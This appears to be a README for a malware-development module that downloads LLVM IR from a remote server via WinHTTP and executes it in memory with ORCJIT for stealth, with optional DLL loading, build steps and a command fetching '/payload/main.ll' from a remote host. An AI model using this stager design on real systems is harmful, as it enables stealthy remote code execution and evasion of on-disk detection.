# IR Payload Staging from Remote Server

Executing LLVM IR directly from memory provides a stealthier and more flexible execution strategy, especially in sandboxed or transient environments. Instead of using traditional on-disk execution like `lli`, this approach demonstrates fetching IR from a remote webserver and executing it entirely in-memory via LLVM’s `ORCJIT` engine.

## Execution Flow

Here's an explanation of how the remotely staged IR is loaded and executed using LLVM's ORCJIT engine in `main.cpp`.

1. Remote Download via WinHTTP: If the `--remoteload` option is used, the IR is downloaded at runtime using Windows HTTP APIs (`WinHttpOpen`, `WinHttpConnect`, `WinHttpReadData`, etc.) and stored into a memory buffer.

   ```cpp
   std::vector<BYTE> raw = DownloadIR(L"host", L"path");
   ```

2. MemoryBuffer Creation: The downloaded byte stream is wrapped in an LLVM `MemoryBuffer`, simulating a file-like interface for the parser.

   ```cpp
   buffer = MemoryBuffer::getMemBufferCopy(...);
   ```

3. IR Parsing in Memory: The buffer is passed into `parseIR`, producing a live LLVM `Module` in memory.

   ```cpp
   mod = parseIR(buffer->getMemBufferRef(), err, *ctx);
   ```

4. ThreadSafeModule Wrapping: The parsed IR module is encapsulated in a `ThreadSafeModule`, which is a requirement for modern ORCJIT usage.

   ```cpp
   auto tsm = ThreadSafeModule(std::move(mod), std::unique_ptr<LLVMContext>(ctx));
   ```

5. JIT Engine Initialization: ORCJIT is initialized with native target support and host symbol loading.

   ```cpp
   auto jit = LLJITBuilder().create();
   ```

6. Optional Shared Library Injection: If a `--load=library.dll` argument is passed, the dynamic library is loaded into the JIT process address space.

   ```cpp
   sys::DynamicLibrary::LoadLibraryPermanently("user32.dll");
   ```

7. IR Module Injection into JIT: The prepared IR module is added to the JIT runtime.

   ```cpp
   jit->addIRModule(std::move(tsm));
   ```

8. `main` Lookup and Execution: The `main` symbol is resolved and cast into a native function pointer, which is then invoked with arguments.

   ```cpp
   auto mainSym = jit->lookup("main");
   int result = mainFn(argc, argv);
   ```

## Build Steps

Use `cmake` to generate and build the Visual Studio project after statically embedding the IR logic in `main.cpp`.

```powershell
## Setup project
IRvana\Maldev\RemoteLoad> mkdir build
IRvana\Maldev\RemoteLoad> cd build
IRvana\Maldev\RemoteLoad> cmake -G "Visual Studio 17 2022" -A x64 ..

## Compile (Release only)
IRvana\Maldev\RemoteLoad> cmake --build . --config Release
```

## Test Execution

The executable supports both local IR files and remote IR download via command-line arguments.

```powershell
## Load IR from remote HTTP host
IRvana\Maldev\RemoteLoad\build\Release> ORCJITExec.exe --remoteload mydomain.com|127.0.0.1 /payload/main.ll
```
